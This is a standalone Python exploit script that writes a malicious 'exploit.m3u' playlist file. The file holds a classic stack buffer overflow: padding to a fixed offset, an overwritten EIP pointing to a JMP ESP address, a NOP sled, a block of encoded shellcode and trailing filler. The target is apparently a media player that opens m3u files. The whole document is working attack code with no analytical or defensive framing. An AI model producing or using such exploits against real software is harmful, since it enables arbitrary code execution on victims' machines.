#!/usr/bin/env python

#Using JMP ESP in EIP
FILE_NAME = 'exploit.m3u'

f = open(FILE_NAME,"w+")

crash_bytes = 30000
offset = 1076

junk1 = '\x41' * (25000 + offset)
#01E1B22A
eip = '\x2a\xb2\xe1\x01' 
nop = '\x90' * 25

shellcode =  ""
shellcode += "\xdb\xd3\xb8\xc9\x19\x3e\xa4\xd9\x74\x24\xf4\x5f"
shellcode += "\x33\xc9\xb1\x31\x31\x47\x18\x83\xc7\x04\x03\x47"
shellcode += "\xdd\xfb\xcb\x58\x35\x79\x33\xa1\xc5\x1e\xbd\x44"
shellcode += "\xf4\x1e\xd9\x0d\xa6\xae\xa9\x40\x4a\x44\xff\x70"
shellcode += "\xd9\x28\x28\x76\x6a\x86\x0e\xb9\x6b\xbb\x73\xd8"
shellcode += "\xef\xc6\xa7\x3a\xce\x08\xba\x3b\x17\x74\x37\x69"
shellcode += "\xc0\xf2\xea\x9e\x65\x4e\x37\x14\x35\x5e\x3f\xc9"
shellcode += "\x8d\x61\x6e\x5c\x86\x3b\xb0\x5e\x4b\x30\xf9\x78"
shellcode += "\x88\x7d\xb3\xf3\x7a\x09\x42\xd2\xb3\xf2\xe9\x1b"
shellcode += "\x7c\x01\xf3\x5c\xba\xfa\x86\x94\xb9\x87\x90\x62"
shellcode += "\xc0\x53\x14\x71\x62\x17\x8e\x5d\x93\xf4\x49\x15"
shellcode += "\x9f\xb1\x1e\x71\x83\x44\xf2\x09\xbf\xcd\xf5\xdd"
shellcode += "\x36\x95\xd1\xf9\x13\x4d\x7b\x5b\xf9\x20\x84\xbb"
shellcode += "\xa2\x9d\x20\xb7\x4e\xc9\x58\x9a\x04\x0c\xee\xa0"
shellcode += "\x6a\x0e\xf0\xaa\xda\x67\xc1\x21\xb5\xf0\xde\xe3"
shellcode += "\xf2\x01\x2e\x3e\xee\x96\x89\xab\x53\xfb\x29\x06"
shellcode += "\x97\x02\xaa\xa3\x67\xf1\xb2\xc1\x62\xbd\x74\x39"
shellcode += "\x1e\xae\x10\x3d\x8d\xcf\x30\x5e\x50\x5c\xd8\x8f"
shellcode += "\xf7\xe4\x7b\xd0"

junk2 = 'C' * (30000 - len(junk1) - len(eip) - len(nop) - len(shellcode)) 
exploit = junk1 + eip + nop + shellcode + junk2

f.write(exploit)

f.close()
